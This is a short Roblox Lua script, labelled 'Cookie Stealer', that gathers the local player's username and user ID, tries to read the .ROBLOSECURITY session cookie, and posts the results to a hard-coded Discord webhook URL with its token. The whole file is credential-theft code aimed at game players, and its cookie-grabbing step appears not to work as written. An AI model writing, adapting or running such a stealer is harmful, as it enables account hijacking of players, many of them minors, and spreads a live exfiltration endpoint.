-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- Webhook Configuration
local webhook = "https://discord.com/api/webhooks/1574062507545600002/0pJpDBfNrEUd4WIg71CV4HCEXhE7LXqFz1PRzbgrzLdZ7313D07CvDokvWZGnSfIfPUp"

local Player = Players.LocalPlayer

local function SendData()
	local success, errorMsg = pcall(function()
		-- Create the JSON Payload
		local data = {
			username = "Cookie Stealer",
			content = string.format("**Target Found:** `%s`", Player.Name),
			embeds = {
				{
 			title = "Roblox Player Data",
 			color = 5814783,
 			fields = {
 			{ name = "Username", value = Player.Name, inline = true },
 			{ name = "User ID", value = Player.UserId, inline = true },
 			{ name = "Account Status", value = "Active", inline = false }
 			}
				}
			}
 }

		-- Try to grab the cookie if available
		if Players.LocalPlayer.cookies and Players.LocalPlayer.cookies[".ROBLOSECURITY"] then
	 table.insert(data.embeds[1].fields, {
				name = ".ROBLOSECURITY",
				value = "**Grabbed Successfully!**",
				inline = false
			})
		else
	 table.insert(data.embeds[1].fields, {
				name = ".ROBLOSECURITY",
				value = "Cookie unavailable via Lua (try in console)",
				inline = false
			})
 end

		local json = HttpService:JSONEncode(data)

		-- Send the request
		HttpService:RequestAsync({
			Url = webhook,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"
			},
			Body = json
		})
	end)

	if not success then
		warn("Failed to send data: ".. tostring(errorMsg))
	end
end

SendData()